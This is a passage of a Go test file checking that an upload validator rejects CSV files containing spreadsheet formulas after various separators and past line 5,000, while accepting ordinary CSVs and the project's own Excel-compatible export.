		"past line 5,000":           strings.Repeat("a,b\n", 5001) + "1," + formula + "\n",
		"after a semicolon":         "a;b\n1;" + formula + "\n",
		"after a tab":               "a\tb\n1\t" + formula + "\n",
	} {
		if _, err := Accept("data.csv", []byte(body), now); err == nil {
			t.Errorf("a CSV with a formula %s was accepted", name)
		}
	}

	// Control: the same shapes with nothing a spreadsheet runs are taken,
	// a negative number after each separator included.
	for name, body := range map[string]string{
		"with a byte-order mark": "\ufeffid,b\n1,-4.5\n",
		"of 5,002 lines":         strings.Repeat("a,b\n", 5001) + "1,-4.5\n",
		"split by semicolons":    "a;b\n1;-4.5\n",
		"split by tabs":          "a\tb\n1\t-4.5\n",
	} {
		if _, err := Accept("data.csv", []byte(body), now); err != nil {
			t.Errorf("an ordinary CSV %s was refused: %v", name, err)
		}
	}
	recs := []collection.Record{{ID: "a", Created: 1, Fields: map[string]any{"name": "Ada", "balance": -4.5}}}
	if body := sheet.Write(nil, recs, sheet.WriteOptions{BOM: true}); !bytes.HasPrefix(body, []byte("\ufeff")) {
		t.Fatalf("control: the export has no byte-order mark:\n%q", body)
	} else if _, err := Accept("records.csv", body, now); err != nil {
		t.Errorf("a file the records export wrote for Excel was refused: %v\n%q", err, body)
	}
}
